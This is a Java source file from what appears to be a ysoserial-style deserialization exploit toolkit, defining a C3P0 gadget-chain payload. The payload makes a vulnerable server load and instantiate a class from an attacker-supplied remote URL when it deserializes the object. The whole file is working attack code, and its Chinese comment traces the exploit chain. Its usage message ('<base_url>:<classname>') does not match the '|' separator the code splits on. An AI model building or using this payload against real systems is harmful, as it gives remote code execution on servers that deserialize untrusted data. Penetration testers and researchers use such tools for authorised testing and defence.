package cn.butler.yso.payloads;


import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import cn.butler.payloads.ObjectPayload;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.annotation.PayloadTest;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;


/**
 * C3P0 远程类加载利用链:
 *  -需要注意如果要多次加载类记得要更换类名
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()
 *   -IndirectlySerialized#getObject()
 *   -com.mchange.v2.naming.ReferenceIndirector#getObject()
 *     -com.mchange.v2.naming.ReferenceableUtils#referenceToObject(Reference ref,Name name,Context nameCtx,Hashtable env)
 *      -URLClassLoader
 *
 * Arguments:
 * - base_url:classname
 *
 * Yields:
 * - Instantiation of remotely loaded class
 *
 * @author mbechler
 *
 */
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.MBECHLER })
public class C3P02 implements ObjectPayload<Object> {
    public Object getObject ( String command ) throws Exception {
        int sep = command.lastIndexOf('|');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P02.class, args);
    }

}
